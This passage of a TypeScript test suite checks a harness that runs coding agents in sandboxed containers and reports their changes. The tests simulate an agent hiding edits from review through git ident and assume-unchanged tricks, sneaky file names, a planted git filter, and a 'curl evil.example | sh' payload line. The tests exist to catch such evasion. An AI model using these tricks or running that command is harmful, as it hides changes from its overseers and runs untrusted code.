      expect(byPath.get(':(glob)x')).toMatchObject({ kind: 'add', ignored: false });
    }, 180_000);

    it('decides ignored paths as Git would: a negation inside an ignored directory, and directory-only patterns', async () => {
      const data = fixture({ hostile: source => {
        writeFileSync(join(source, '.gitignore'), 'node_modules/*\n!node_modules/local-pkg/\nbuild/\n');
        mkdirSync(join(source, 'build')); writeFileSync(join(source, 'build', '.gitignore'), '*.o\n');
        git(source, 'add', '-f', 'build/.gitignore');
      } });
      asAgent(data.filesystems, [
        'mkdir -p node_modules/local-pkg node_modules/other', 'printf "l\\n" > node_modules/local-pkg/index.js',
        'printf "o\\n" > node_modules/other/x.js',
        // A file where base had a directory: "build/" matches directories only.
        'rm -rf build && printf "b\\n" > build'].join(' && '));
      const manifest = await inspectTaskChanges(data.filesystems, { base: data.clone.head, imageId, linkSnapshot: { links: [] } });
      const byPath = new Map(manifest.changes.map(change => [change.path, change]));
      expect(byPath.get('node_modules/local-pkg/index.js')).toMatchObject({ kind: 'add', ignored: false });
      expect(byPath.get('node_modules/other')).toMatchObject({ kind: 'add', newType: 'directory', ignored: true });
      expect(byPath.get('build')).toMatchObject({ kind: 'add', newType: 'file', ignored: false });
      expect(byPath.get('build/.gitignore')).toMatchObject({ kind: 'delete' });
    }, 180_000);

    it('keeps base\'s ignore rules when the agent puts a directory where a .gitignore was', async () => {
      const data = fixture({ hostile: source => {
        writeFileSync(join(source, '.gitignore'), 'out/\n');
        mkdirSync(join(source, 'sub')); writeFileSync(join(source, 'sub', '.gitignore'), '!out/\n'); writeFileSync(join(source, 'sub', 'a'), 'a\n');
      } });
      asAgent(data.filesystems, ['rm sub/.gitignore', 'mkdir sub/.gitignore', 'printf "f\\n" > sub/.gitignore/f',
        'mkdir -p sub/out', 'printf "p\\n" > sub/out/payload.sh'].join(' && '));
      const manifest = await inspectTaskChanges(data.filesystems, { base: data.clone.head, imageId, linkSnapshot: { links: [] } });
      const byPath = new Map(manifest.changes.map(change => [change.path, change]));
      // base's sub/.gitignore re-includes sub/out, so what is inside is listed.
      expect(byPath.get('sub/out/payload.sh')).toMatchObject({ kind: 'add', ignored: false });
      expect(byPath.get('sub/.gitignore')).toMatchObject({ kind: 'modify', oldType: 'file', newType: 'directory' });
    }, 180_000);

    it('reports what a commit would store: nothing for an honest CRLF checkout, the stored blob under ident', async () => {
      const data = fixture({ hostile: source => {
        writeFileSync(join(source, '.gitattributes'), '*.txt eol=crlf\nid.c ident\n');
        writeFileSync(join(source, 'a.txt'), 'one\ntwo\n'); writeFileSync(join(source, 'id.c'), '$Id$\n');
      } });
      const untouched = await inspectTaskChanges(data.filesystems, { base: data.clone.head, imageId, linkSnapshot: { links: [] } });
      // The checkout wrote CRLF and an expanded $Id$; Git would store what base has, so neither is a change.
      expect(untouched.changes).toEqual([]);
      asAgent(data.filesystems, 'printf "one\\r\\nTWO\\r\\n" > a.txt && printf "\\$Id: anything \\$\\n" > id.c');
      const edited = await inspectTaskChanges(data.filesystems, { base: data.clone.head, imageId, linkSnapshot: { links: [] } });
      // The CRLF edit is one line; the $Id$ keyword is stored collapsed, so what a commit would store did not change.
      expect(edited.changes.map(change => change.path)).toEqual(['a.txt']);
      // Stored with LF, as eol=crlf converts it: the blob of "one\ntwo" with the edit, not of the CRLF bytes on disk.
      expect(edited.changes[0]!.newOid).toBe(createHash('sha1').update('blob 8\0one\nTWO\n').digest('hex'));
    }, 180_000);

    it('names every file exactly: a name that starts with a quote, and one that looks like a paired rename', async () => {
      const data = fixture({ hostile: source => { writeFileSync(join(source, 'foo'), 'same\n'); writeFileSync(join(source, 'Q'), 'q\n');
        writeFileSync(join(source, 'Z'), 'z\n'); } });
      asAgent(data.filesystems, [
        // A rename, and a new file whose name is the deleted path behind a dash.
        'mv foo bar', 'printf "evil\\n" > ./-foo',
        // A deletion, and a rename onto a name that is the deleted path behind a dash.
        'rm Q', 'mv Z ./-Q',
        // Git unquotes a hashed path that starts with a double quote: this one must still be hashed as itself.
        `printf "quoted\\n" > '"x"'`, 'printf "other\\n" > x'].join(' && '));
      const manifest = await inspectTaskChanges(data.filesystems, { base: data.clone.head, imageId, linkSnapshot: { links: [] } });
      const byPath = new Map(manifest.changes.map(change => [change.path, change]));
      expect(byPath.get('bar')).toMatchObject({ kind: 'rename', oldPath: 'foo' });
      expect(byPath.get('-foo')).toMatchObject({ kind: 'add' });
      expect(byPath.get('-Q')).toMatchObject({ kind: 'rename', oldPath: 'Z' });
      expect(byPath.get('Q')).toMatchObject({ kind: 'delete' });
      expect(byPath.get('"x"')!.newOid).not.toBe(byPath.get('x')!.newOid);
    }, 180_000);

    it('reports content in a gitlink directory, and anything that changed the metadata', async () => {
      const data = fixture({ hostile: source => {
        mkdirSync(join(source, 'sm'));
        git(source, 'update-index', '--add', '--cacheinfo', `160000,${'1'.repeat(40)},sm`);
      } });
      asAgent(data.filesystems, 'printf "work\\n" > sm/work.c');
      const quiet = await inspectTaskChanges(data.filesystems, { base: data.clone.head, imageId, linkSnapshot: { links: [] } });
      expect(quiet.nestedGitlinkContent).toEqual(['sm']);
      expect(quiet.changes.map(change => change.path)).not.toContain('sm/work.c');
      expect(quiet).toMatchObject({ agentCommits: [], metadataChanged: false });
      // Any write under .git, not only a commit: a changed mode on the config file.
      docker('run', '--rm', '--network=none', '--user', '10001:10001',
        '--mount', `type=volume,source=${data.filesystems.metadataVolume},target=/work/.git`, '--entrypoint', 'chmod', imageId,
        '600', '/work/.git/config');
      const chmodded = await inspectTaskChanges(data.filesystems, { base: data.clone.head, imageId, linkSnapshot: { links: [] } });
      expect(chmodded).toMatchObject({ agentCommits: [], metadataChanged: true });
      // Agents mount the metadata read-only, so they cannot commit; this stands in for that protection failing.
      docker('run', '--rm', '--network=none', '--user', '10001:10001', '--tmpfs', '/tmp', '--env', 'HOME=/tmp',
        '--mount', `type=volume,source=${data.filesystems.workVolume},target=/work`,
        '--mount', `type=volume,source=${data.filesystems.metadataVolume},target=/work/.git`, '--entrypoint', 'git', imageId,
        '-C', '/work', '-c', 'user.name=agent', '-c', 'user.email=agent@example.com', 'commit', '-q', '--allow-empty', '-m', 'agent');
      const committed = await inspectTaskChanges(data.filesystems, { base: data.clone.head, imageId, linkSnapshot: { links: [] } });
      expect(committed.agentCommits.length).toBeGreaterThan(0);
      expect(committed.metadataChanged).toBe(true);
      expect(committed.digest).not.toBe(quiet.digest);
    }, 180_000);

    it('hashes as git add does: CRLF that base stores under text=auto stays CRLF', async () => {
      const data = fixture({ hostile: source => {
        // Committed with CRLF before text=auto was set: git add leaves such a file's line endings alone.
        writeFileSync(join(source, 'crlf.txt'), 'a\r\n'); git(source, 'add', 'crlf.txt'); git(source, 'commit', '-m', 'crlf');
        writeFileSync(join(source, '.gitattributes'), '* text=auto\n');
      } });
      const inspect = () => inspectTaskChanges(data.filesystems, { base: data.clone.head, imageId, linkSnapshot: { links: [] } });
      expect((await inspect()).changes).toEqual([]);
      asAgent(data.filesystems, 'printf "b\\r\\n" > crlf.txt');
      expect((await inspect()).changes).toEqual([expect.objectContaining({ kind: 'modify', path: 'crlf.txt',
        newOid: createHash('sha1').update('blob 3\0b\r\n').digest('hex') })]);
    }, 180_000);

    it('fails with Git\'s reason when it cannot hash as a commit would, and names a .gitattributes it could not open', async () => {
      const data = fixture();
      const inspect = () => inspectTaskChanges(data.filesystems, { base: data.clone.head, imageId, linkSnapshot: { links: [] } });
      asAgent(data.filesystems, 'printf "file.txt working-tree-encoding=NOPE-ENC\\n" > .gitattributes');
      await expect(inspect()).rejects.toThrow(/git update-index failed \(status 0\): error: failed to encode/);
      // A fifo where Git reads attributes would block it until the deadline.
      asAgent(data.filesystems, 'rm .gitattributes && mkfifo .gitattributes');
      await expect(inspect()).rejects.toThrow(/exit 6\): the attributes file \.gitattributes is not a regular file/);
    }, 180_000);

    it('reads every file: an edit the index vouches for is still a change', async () => {
      const data = fixture();
      // Edit file.txt, then mark it assume-unchanged, so Git's own check skips it, as it skips a file whose times did
      // not move with its content. Nothing may rely on Git's view of the index.
      asAgent(data.filesystems, 'printf "hidden edit\\n" > file.txt');
      docker('run', '--rm', '--network=none', '--user', '10001:10001', '--tmpfs', '/tmp', '--env', 'HOME=/tmp',
        '--mount', `type=volume,source=${data.filesystems.workVolume},target=/work`,
        '--mount', `type=volume,source=${data.filesystems.metadataVolume},target=/work/.git`, '--entrypoint', 'git', imageId,
        '-C', '/work', 'update-index', '--assume-unchanged', 'file.txt');
      const manifest = await inspectTaskChanges(data.filesystems, { base: data.clone.head, imageId, linkSnapshot: { links: [] } });
      expect(manifest.changes).toEqual([expect.objectContaining({ kind: 'modify', path: 'file.txt' })]);
    }, 180_000);

    it('fails, never truncates, on too many changes and on a name that is not UTF-8', async () => {
      const data = fixture({ limits: { workBytes: 64 * 1024 * 1024, workInodes: 12_000, metadataBytes: 16 * 1024 * 1024,
        metadataInodes: 512 } });
      const inspect = () => inspectTaskChanges(data.filesystems, { base: data.clone.head, imageId, linkSnapshot: { links: [] } });
      asAgent(data.filesystems, `printf "x\\n" > "$(printf "bad\\377")"`);
      await expect(inspect()).rejects.toThrow(/bad\\xff is not printable UTF-8/);
      // A surrogate code point: a lax decoder accepts it, and Node would show it as U+FFFD, like another real name.
      asAgent(data.filesystems, `rm -f bad*; printf "x\\n" > "$(printf "s\\355\\240\\200")"`);
      await expect(inspect()).rejects.toThrow(/s\\xed\\xa0\\x80 is not printable UTF-8/);
      // An invisible right-to-left mark: "x" and "x\u200f" would show as one name.
      asAgent(data.filesystems, `rm -f s*; printf "x\\n" > "$(printf "x\\342\\200\\217")"`);
      await expect(inspect()).rejects.toThrow(/x\\xe2\\x80\\x8f is not printable UTF-8/);
      // A C1 control character (U+009B, which some terminals read as the start of an escape sequence).
      asAgent(data.filesystems, `rm -f x*; printf "x\\n" > "$(printf "c\\302\\233")"`);
      await expect(inspect()).rejects.toThrow(/c\\xc2\\x9b is not printable UTF-8/);
      // A name longer than the manifest carries.
      asAgent(data.filesystems, `rm -f c*; mkdir -p "$(printf 'd%.0s' $(seq 1 200))" && cd "$(printf 'd%.0s' $(seq 1 200))" && for i in 1 2 3 4 5 6; do mkdir "$(printf 'e%.0s' $(seq 1 200))" && cd "$(printf 'e%.0s' $(seq 1 200))"; done && : > f`);
      await expect(inspect()).rejects.toThrow(`longer than ${MAXIMUM_NAME_BYTES} bytes`);
      // A file it cannot read is refused by name, not passed to Git.
      asAgent(data.filesystems, 'rm -rf dd* && chmod 000 file.txt');
      await expect(inspect()).rejects.toThrow(/exit 6\): could not read file\.txt/);
      asAgent(data.filesystems, `chmod 644 file.txt; mkdir many; cd many; for i in $(seq 1 ${MAXIMUM_CHANGES + 1}); do : > "$i"; done`);
      await expect(inspect()).rejects.toThrow(`more than ${MAXIMUM_CHANGES} new entries`);
    }, 240_000);

    it('counts each declared target once, so a target the snapshot accepted is inspected too', async () => {
      const data = fixture({ limits: { workBytes: 64 * 1024 * 1024, workInodes: 14_000, metadataBytes: 16 * 1024 * 1024,
        metadataInodes: 512 }, hostile: source => {
        mkdirSync(join(source, 'big')); for (let i = 0; i < 12_000; i += 1) writeFileSync(join(source, 'big', String(i)), '');
        symlinkSync('big', join(source, 'biglink'));
      } });
      // More than half the limit: counted twice, the inspection would refuse what the snapshot accepted.
      const linkSnapshot = await snapshotDeclaredLinks(data.filesystems, ['biglink'], { imageId });
      expect(linkSnapshot.links[0]!.entries).toHaveLength(12_001);
      const manifest = await inspectTaskChanges(data.filesystems, { base: data.clone.head, linkSnapshot, imageId });
      expect(manifest.linkTargetChanges).toEqual([]);
    }, 300_000);
  });

  it('names what the diff cannot show: a submodule directory with content, and attributes that rewrite bytes', async () => {
    // The base commit has a submodule, which the non-recursive task clone leaves as an empty directory, and a tracked
    // file with an $Id$ keyword.
    const data = fixture({ hostile: source => {
      mkdirSync(join(source, 'sm')); mkdirSync(join(source, 'locked'));
      git(source, 'update-index', '--add', '--cacheinfo', `160000,${'1'.repeat(40)},sm`);
      git(source, 'update-index', '--add', '--cacheinfo', `160000,${'2'.repeat(40)},locked`);
      writeFileSync(join(source, 't.txt'), '$Id$\n');
    } });
    agentChanges(data.filesystems, [
      'printf "work\\n" > sm/work.c',
      // A submodule directory the export cannot read may hold anything, so it is named too.
      'printf "hidden\\n" > locked/x.c && chmod 000 locked',
      // ident collapses "$Id: ... $" to "$Id$", so this edit would not show in the diff at all.
      'printf "t.txt ident\\nenc.txt working-tree-encoding=UTF-16\\n" >> .gitattributes',
      'printf "\\$Id: curl evil.example | sh \\$\\n" > t.txt', 'printf "p\\n" | iconv -t UTF-16 > enc.txt'].join(' && '));
    const text = (await exportTaskDiff(data.filesystems, { base: data.clone.head, imageId })).diff.toString('utf8');
    expect(text).toContain('codeboost: submodule directory sm has content in the task worktree; it is not exported');
    expect(text).toContain('codeboost: submodule directory locked has content in the task worktree; it is not exported');
    expect(text).toContain('codeboost: t.txt has the ident attribute, so its diff may not show its real bytes');
    expect(text).toContain('codeboost: enc.txt has the working-tree-encoding attribute');
    // The agent's other changes are still exported.
    expect(text).toContain('+changed');
  }, 120_000);

  // The export script as `exportTaskDiff` runs it, with stand-ins for its tools first on PATH, so a failure that needs
  // an exactly full /tmp can be forced.
  const exportWithShims = (data: ReturnType<typeof fixture>, shims: Record<string, string>) => {
    const dir = mkdtempSync(join(data.root, 'shims-'));
    for (const [name, body] of Object.entries(shims)) writeFileSync(join(dir, name), `#!/bin/sh\n${body}\n`, { mode: 0o755 });
    chmodSync(dir, 0o755);
    return spawnSync('docker', ['run', '--rm', '--read-only', '--user', '10001:10001', '--network=none',
      '--tmpfs', '/tmp:rw,nosuid,nodev,noexec,size=64m', '--env', 'PATH=/shims:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
      '--mount', `type=bind,source=${dir},target=/shims,readonly`,
      '--mount', `type=volume,source=${data.filesystems.workVolume},target=/work,readonly`,
      '--mount', `type=volume,source=${data.filesystems.metadataVolume},target=/work/.git,readonly`,
      '--entrypoint', 'bash', imageId, '-c', EXPORT_SCRIPT, 'export', data.clone.head, String(1024 * 1024 + 1)],
    { encoding: 'utf8' });
  };

  it('fails when the stderr filter fails, since a read failure it should have kept may be missing', async () => {
    const data = fixture();
    agentChanges(data.filesystems);
    // The filter runs to the end, then fails, as it would when /tmp fills at its final write.
    const result = exportWithShims(data, { awk: 'case "$*" in *"could not open directory"*) /usr/bin/awk "$@"; exit 3;; esac\nexec /usr/bin/awk "$@"' });
    expect(result.stderr).toContain('the export could not check Git\'s warnings');
    expect(result.status).toBe(5);
  }, 120_000);

  it('fails when Git is stopped by SIGPIPE before the output reached its limit', async () => {
    const data = fixture();
    agentChanges(data.filesystems);
    // Only the head that applies the limit stops early; any other use of head is passed through.
    const result = exportWithShims(data, { head: 'if [ "$1" = -c ] && [ "$2" -gt 1000 ]; then exec /usr/bin/head -c 10; fi\nexec /usr/bin/head "$@"' });
    expect(result.stderr).toContain('git stopped on SIGPIPE before the output reached its limit');
    expect(result.status).toBe(5);
  }, 120_000);

  it('says what Git reported when it fails', async () => {
    const data = fixture();
    // agentChanges also replaces a tracked directory with a link to /etc/ssl, so Git first prints an error about a file
    // behind it that does not stop it; the reason must still be the one Git stopped on.
    agentChanges(data.filesystems, 'rm file.txt && mkfifo file.txt');
    await expect(exportTaskDiff(data.filesystems, { base: data.clone.head, imageId }))
      .rejects.toThrow(/git failed while exporting the diff \(status \d+\): error: file\.txt: unsupported file type; fatal: /);
  }, 120_000);

  it('names files over 8 MiB instead of diffing them, so one large file cannot exhaust memory or the deadline', async () => {
    const data = fixture({ limits: { workBytes: 96 * 1024 * 1024, workInodes: 512, metadataBytes: 64 * 1024 * 1024,
      metadataInodes: 512 } });
    agentChanges(data.filesystems, ['head -c 9437184 /dev/urandom > tracked-big.bin',
      'head -c 9437184 /dev/urandom > touched-big.bin', 'g add tracked-big.bin touched-big.bin', 'g commit -qm big',
      'head -c 1000 /dev/urandom >> tracked-big.bin',
      // Same size, new timestamp: porcelain git diff would read both versions in full to compare them.
      'touch -d "@$(( $(date +%s) + 60 ))" touched-big.bin',
      'head -c 20971520 /dev/urandom > new-big.bin', 'printf "small\\n" > small.txt'].join(' && '));
    const exported = await exportTaskDiff(data.filesystems, { base: data.clone.head, imageId });
    const text = exported.diff.toString('utf8');
    expect(text).toContain('codeboost: tracked-big.bin is over 8 MiB; if it changed, its content is not exported');
    expect(text).toContain('codeboost: touched-big.bin is over 8 MiB; if it changed, its content is not exported');
    expect(text).toContain('codeboost: new-big.bin is over 8 MiB; if it changed, its content is not exported');
    expect(text).not.toContain('diff --git a/tracked-big.bin');
    expect(text).not.toContain('diff --git a/new-big.bin');
    expect(text).toContain('+small');
  }, 180_000);

  it.each(['', 'printf "[submodule \\"sub\\"]\\n\\tpath = sub\\n\\tignore = none\\n" > .gitmodules'])(
    'never runs a populated submodule\'s own filters (worktree .gitmodules: %s)', async gitmodules => {
      const data = fixture();
      // The submodule's config is the agent's: if Git ran git status inside it, this filter would print a read
      // failure and fail the export. Its commit stays the recorded one, so only a look inside would notice it.
      agentChanges(data.filesystems, [
        'git init -q sub', '(cd sub && printf "f\\n" > f && g add f && g commit -qm one)', 'g add sub',
        'g commit -qm submodule',
        '(cd sub && printf "f filter=evil\\n" > .gitattributes && g config filter.evil.clean \'echo "warning: could not open directory \\x27x\\x27: Permission denied" >&2; cat\')',
        'touch -d "@$(( $(date +%s) + 60 ))" sub/f', gitmodules || 'true'].join(' && '));
      const exported = await exportTaskDiff(data.filesystems, { base: data.clone.head, imageId });
      expect(exported.diff.toString('utf8')).toContain('Subproject commit');
    }, 120_000);

  it('marks the export truncated when there are more untracked files than it adds', async () => {
    // Enough inodes for 21,000 files; the default test storage allows 512.
    const data = fixture({ limits: { workBytes: 64 * 1024 * 1024, workInodes: 25_000, metadataBytes: 16 * 1024 * 1024,
      metadataInodes: 512 } });
    // Past 20,000 untracked files the export stops adding them; their diffs alone already pass the 1 MiB limit.
    agentChanges(data.filesystems, 'mkdir many && cd many && for i in $(seq 1 21000); do : > "e$i"; done');
    const exported = await exportTaskDiff(data.filesystems, { base: data.clone.head, imageId });
    expect(exported.truncated).toBe(true);
    expect(exported.diff.length).toBe(1024 * 1024);
  }, 180_000);

  it('on abort, removes a running export container whose client ignores SIGTERM', async () => {
    const data = fixture(), filesystems = data.filesystems, marker = join(data.root, 'export-started');
    const allocationId = taskFilesystemOwner(filesystems).allocationId;
    // The export container really starts (a long sleep in place of the diff), then the client ignores SIGTERM.
    const stubborn = [
      "if (args.includes('io.codeboost.task-storage=export')) {",
      "  const at = args.indexOf('-c'); args.splice(at, 2, '-c', 'sleep 300'); args.splice(1, 0, '--detach');",
      '  result = run(args);',
      `  require('node:fs').writeFileSync(${JSON.stringify(marker)}, '');`,
      "  process.on('SIGTERM', () => {});",
      '  Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0);',
      '} else result = run(args);',
    ].join('\n');
    const controller = new AbortController();
    const waitForStart = setInterval(() => { if (existsSync(marker)) controller.abort(); }, 20);
    const began = performance.now();
    try {
      const error = await withDockerShim(['run', '--rm'], stubborn, () => exportTaskDiff(filesystems,
        { base: data.clone.head, imageId, signal: controller.signal }).then(() => undefined, caught => caught));
      expect(error).toMatchObject({ name: 'AbortError', code: 'ABORT_ERR' });
    } finally { clearInterval(waitForStart); }
    expect(performance.now() - began).toBeGreaterThanOrEqual(5_000);
    expect(docker('ps', '--all', '--quiet', '--filter', 'label=io.codeboost.task-storage=export',
      '--filter', `label=io.codeboost.allocation=${allocationId}`)).toBe('');
  }, 120_000);

  it('keeps a failed allocation whose cleanup did not settle live, so recovery in this process refuses its runner', async () => {
    const data = fixture(), runnerOwner = randomBytes(16).toString('hex');
    const owner = { runnerOwner, attemptId: 'unsettled-allocation', allocationId: randomUUID() };
    // The seeder is refused, and every volume removal fails, so the allocation's cleanup does not settle.
    const failing = [
      "if (args[0] === 'run' && args[1] === '--rm') result = { status: 1, stdout: '', stderr: 'refused' };",
      "else if (args[0] === 'volume' && args[1] === 'rm') result = { status: 1, stdout: '', stderr: 'volume is in use' };",
      'else result = run(args);',
    ].join('\n');
    try {
      await withDockerShim([], failing, () => expect(() => prepareTaskFilesystems(data.clone, storageLimits, imageId,
        owner)).toThrow('cleanup did not settle'));
      await expect(recoverLeftovers(runnerOwner)).rejects.toThrow('still holds task storage');
    } finally {
      for (const name of docker('ps', '--all', '--quiet', '--filter', `label=io.codeboost.allocation=${owner.allocationId}`)
        .split('\n').filter(Boolean)) spawnSync('docker', ['rm', '--force', name], { stdio: 'ignore' });
      for (const name of docker('volume', 'ls', '--quiet', '--filter', `label=io.codeboost.allocation=${owner.allocationId}`)
        .split('\n').filter(Boolean)) spawnSync('docker', ['volume', 'rm', '--force', name], { stdio: 'ignore' });
    }
  }, 60_000);

  it('recovers only its own runner after a restart, keeping its storage for removal by handle', async () => {
    const data = fixture(), runners = [randomBytes(16).toString('hex'), randomBytes(16).toString('hex')] as const;
    // Every object is registered for cleanup as soon as it exists, so a failure anywhere in setup leaks nothing.
    // Cleanup runs in reverse: containers go before the networks and volumes they use.
    const undo: (() => unknown)[] = [];
    const quietly = (...args: string[]) => () => spawnSync('docker', args, { stdio: 'ignore' });
    const exists = (kind: 'container' | 'volume' | 'network', ref: string) =>
      spawnSync('docker', [kind, 'inspect', ref], { stdio: 'ignore' }).status === 0;
    const label = (labels: Record<string, string>) => Object.entries(labels).flatMap(([key, value]) =>
      ['--label', `${key}=${value}`]);
    // What a crashed process leaves for the first runner, made with the labels and names D writes, so nothing in this
    // process owns it: storage with its keeper and a seeder that never finished, storage whose keeper was never
    // created, and an agent container with its proxy on the vendor network.
    const crashed = (runnerOwner: string) => {
      const attemptId = `crashed-${randomUUID()}`, owner = (allocation: string) => ({ 'io.codeboost.runner': runnerOwner,
        'io.codeboost.attempt': attemptId, 'io.codeboost.allocation': allocation });
      const volume = (name: string, labels: Record<string, string>) => {
        undo.push(quietly('volume', 'rm', '--force', name));
        docker('volume', 'create', ...label(labels), name);
      };
      const container = (name: string, ...args: string[]) => {
        undo.push(quietly('rm', '--force', name));
        docker(...args);
      };
      const storage = (withKeeper: boolean) => {
        const allocation = randomUUID(), work = `codeboost-work-${randomUUID()}`, metadata = `codeboost-metadata-${randomUUID()}`;
        volume(work, { ...owner(allocation), 'io.codeboost.task-storage': 'work' });
        volume(metadata, { ...owner(allocation), 'io.codeboost.task-storage': 'metadata' });
        const mounts = ['--mount', `type=volume,source=${work},target=/work`, '--mount',
          `type=volume,source=${metadata},target=/metadata`];
        const keeper = `codeboost-keeper-${randomUUID()}`, seeder = `codeboost-seeder-${randomUUID()}`;
        if (withKeeper) {
          container(keeper, 'run', '--detach', '--name', keeper, '--network=none', ...mounts,
            ...label({ ...owner(allocation), 'io.codeboost.task-storage': 'keeper' }), '--entrypoint', 'sleep', imageId, 'infinity');
          container(seeder, 'create', '--name', seeder, '--network=none', ...mounts,
            ...label({ ...owner(allocation), 'io.codeboost.task-storage': 'seeder' }), '--entrypoint', 'true', imageId);
        }
        return { allocation, work, metadata, keeper: withKeeper ? keeper : undefined, seeder: withKeeper ? seeder : undefined };
      };
      const full = storage(true), partial = storage(false);
      const egress = randomUUID(), network = `codeboost-egress-codex-${randomUUID()}`;
      const proxy = `codeboost-proxy-codex-${randomUUID()}`, agent = `codeboost-agent-${randomUUID()}`;
      const egressLabels = { ...owner(egress), 'io.codeboost.egress': egress };
      undo.push(quietly('network', 'rm', network));
      docker('network', 'create', '--internal', ...label(egressLabels), network);
      container(proxy, 'create', '--name', proxy, '--network', network, ...label(egressLabels), '--entrypoint', 'true', imageId);
      container(agent, 'create', '--name', agent, '--network', network, '--mount',
        `type=volume,source=${full.work},target=/work`,
        ...label({ ...owner(full.allocation), 'io.codeboost.invocation': randomUUID() }), '--entrypoint', 'true', imageId);
      return { attemptId, full, partial, network, proxy, agent };
    };
    // The second runner is live in this process: task storage, a vendor network and an agent container.
    const live = async (runnerOwner: string) => {
      const captured = captureInvocation({ runnerOwner, clone: data.clone, phase: 'planning', vendor: 'codex',
        approvedArgv: [], deadline: Date.now() + 60_000, attemptId: `recovery-${randomUUID()}`,
        context: { snapshotId: 's', planId: 'p', planRevision: 1, assignmentId: 'a', referencedCodeHash: 'c',
          stateVersion: 1 } });
      const storage = prepareTaskFilesystems(data.clone, storageLimits, imageId,
        { runnerOwner, attemptId: captured.attemptId, allocationId: randomUUID() });
      undo.push(() => removeTaskFilesystems(storage));
      const policy = createPhasePolicy(captured), network = await createVendorNetwork(captured, imageId, randomUUID());
      undo.push(() => removeVendorNetwork(network));
      const profile = await createContainerProfile({ invocation: captured, policy, network, filesystems: storage,
        inputDirectory: data.input, command: createIsolationProbeCommand(policy, 'noop'), imageId,
        codexAuthFile: data.fakeAuth });
      profiles.push(profile);
      undo.push(() => disposeValidatedContainer(profile));
      await createValidatedContainer(profile);
      return { storage, network, profile };
    };
    try {
      const mine = crashed(runners[0]), theirs = await live(runners[1]);
      // An object from a build before runner labels.
      const legacy = `codeboost-work-legacy-${randomUUID()}`;
      undo.push(quietly('volume', 'rm', '--force', legacy));
      docker('volume', 'create', '--label', `io.codeboost.allocation=${randomUUID()}`, legacy);
      // A runner with live storage in this process is refused: its agents would be removed under it.
      await expect(recoverLeftovers(runners[1])).rejects.toThrow('still holds task storage');
      const report = await recoverLeftovers(runners[0]);
      expect(report.removed.map(resource => resource.name).sort())
        .toEqual([mine.agent, mine.proxy, mine.full.seeder, mine.network].sort());
      for (const ref of [mine.agent, mine.proxy, mine.full.seeder!]) expect(exists('container', ref)).toBe(false);
      expect(exists('network', mine.network)).toBe(false);
      expect(report.unowned).toContainEqual(expect.objectContaining({ name: legacy, reason: 'no-runner-label' }));
      expect(exists('volume', legacy)).toBe(true);
      // Both storage allocations are kept, the keeper running, and only their recovery handles release them.
      expect([...report.storage].sort((a, b) => a.allocationId.localeCompare(b.allocationId))).toEqual([
        { runnerOwner: runners[0], attemptId: mine.attemptId, allocationId: mine.full.allocation,
          workVolume: mine.full.work, metadataVolume: mine.full.metadata, keeper: mine.full.keeper },
        { runnerOwner: runners[0], attemptId: mine.attemptId, allocationId: mine.partial.allocation,
          workVolume: mine.partial.work, metadataVolume: mine.partial.metadata },
      ].sort((a, b) => a.allocationId.localeCompare(b.allocationId)));
      expect(docker('container', 'inspect', '--format', '{{.State.Running}}', mine.full.keeper!)).toBe('true');
      for (const handle of report.storage) {
        removeTaskFilesystems(handle);
        expect(isRecoveredTaskStorage(handle)).toBe(false);
      }
      for (const [kind, ref] of [['container', mine.full.keeper!], ['volume', mine.full.work],
        ['volume', mine.full.metadata], ['volume', mine.partial.work], ['volume', mine.partial.metadata]] as const)
        expect(exists(kind, ref)).toBe(false);
      // The other runner's objects are untouched.
      for (const [kind, ref] of [['container', theirs.profile.name], ['container', theirs.network.proxyContainer],
        ['network', theirs.network.name], ['container', theirs.storage.keeper], ['volume', theirs.storage.workVolume],
        ['volume', theirs.storage.metadataVolume]] as const) expect(exists(kind, ref)).toBe(true);
    } finally {
      const failures: unknown[] = [];
      for (const step of undo.reverse()) {
        try { await step(); } catch (error) { failures.push(error); }
      }
      if (failures.length) throw new AggregateError(failures, 'Recovery test cleanup failed.');
    }
  }, 180_000);

  it('never removes a task keeper replaced by another runner, but still removes the owned volumes', () => {
    const data = fixture(), filesystems = data.filesystems, owner = taskFilesystemOwner(filesystems);
    taskFilesystems.splice(taskFilesystems.indexOf(filesystems), 1);
    docker('rm', '--force', filesystems.keeper);
    docker('run', '--detach', '--name', filesystems.keeper, '--label', `io.codeboost.runner=${'f'.repeat(32)}`,
      '--label', `io.codeboost.attempt=${owner.attemptId}`, '--label', `io.codeboost.allocation=${owner.allocationId}`,
      '--network=none', '--entrypoint', 'sleep', imageId, 'infinity');
    try {
      expect(() => removeTaskFilesystems(filesystems)).toThrow('did not settle');
      expect(docker('container', 'inspect', '--format', '{{.State.Running}}', filesystems.keeper)).toBe('true');
      expect(spawnSync('docker', ['volume', 'inspect', filesystems.workVolume]).status).not.toBe(0);
    } finally {
      docker('rm', '--force', filesystems.keeper);
      removeTaskFilesystems(filesystems);
    }
  }, 60_000);

  it('refuses task storage that belongs to another runner', async () => {
    const data = fixture();
    const foreign = prepareTaskFilesystems(data.clone, { workBytes: 16 * 1024 * 1024, workInodes: 512,
      metadataBytes: 16 * 1024 * 1024, metadataInodes: 512 }, imageId,
    { runnerOwner: 'f'.repeat(32), attemptId: 'other-runner', allocationId: randomUUID() });
    taskFilesystems.push(foreign);
    await expect(createContainerProfile({ ...await governed(invocation(data.clone, 'planning')), filesystems: foreign,
      inputDirectory: data.input, codexAuthFile: data.fakeAuth, imageId })).rejects.toThrow('another runner');
  }, 60_000);

  it('refuses to seed a clone whose staging directory was replaced after creation', async () => {
    const data = fixture();
    const clone = createTaskClone({ source: data.source, parent: join(data.root, 'staging'), taskId: 'task-2',
      head: git(data.source, 'rev-parse', 'HEAD') });
    renameSync(clone.directory, `${clone.directory}-original`);
    mkdirSync(clone.directory); git(clone.directory, 'init');
    expect(() => prepareTaskFilesystems(clone, {
      workBytes: 16 * 1024 * 1024, workInodes: 512, metadataBytes: 16 * 1024 * 1024, metadataInodes: 512,
    }, imageId, testOwner())).toThrow('replaced after it was created');
  }, 60_000);

  it('rejects a container that relies on the daemon default seccomp profile', async () => {
    const data = fixture(), valid = await profile(data, 'planning', 'noop');
    docker(...valid.args.filter(arg => arg !== '--security-opt=seccomp=builtin')); containers.add(valid.name);
    await expect(validateContainer(valid.name, valid)).rejects.toThrow('lockdown');
    docker('rm', '--force', valid.name); containers.delete(valid.name);
  }, 60_000);

  it('startup probe refuses to exec when seccomp filtering is disabled', async () => {
